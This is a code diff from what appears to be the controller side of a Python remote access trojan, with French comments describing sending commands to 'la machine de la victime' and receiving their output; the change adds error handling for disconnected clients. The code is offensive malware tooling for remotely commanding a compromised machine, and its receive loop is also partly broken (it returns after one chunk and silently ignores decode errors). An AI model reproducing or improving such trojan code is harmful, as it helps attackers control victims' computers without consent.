@@ -83,23 +83,33 @@ def connection():
 
 #la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
 def sending(command):
-    # Convert the command to JSON format and send it
-    json_data = json.dumps(command)
-    target.send(json_data.encode())
+    try:
+        # Convert the command to JSON format and send it
+        json_data = json.dumps(command)
+        target.send(json_data.encode())  # Envoie la commande au client
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Error sending data: {e}")
+        print("Client may have disconnected or is offline.")
+        return False
+    return True
+
 
 #la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
 def receive():
     json_data = ""
-    while True:
-        try:
-            # Receive data from the target in chunks
+    try:
+        while True:
             chunk = target.recv(4096).decode('utf-8', errors='replace')
             if not chunk:
-                break
+                raise ConnectionResetError("Client has disconnected or is offline.")
             json_data += chunk
             return json.loads(json_data)
-        except json.JSONDecodeError:
-            continue
+    except json.JSONDecodeError:
+        pass
+    except ConnectionResetError as e:
+        print(f"Error: {e}")
+        return None
+
 
 
 #la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
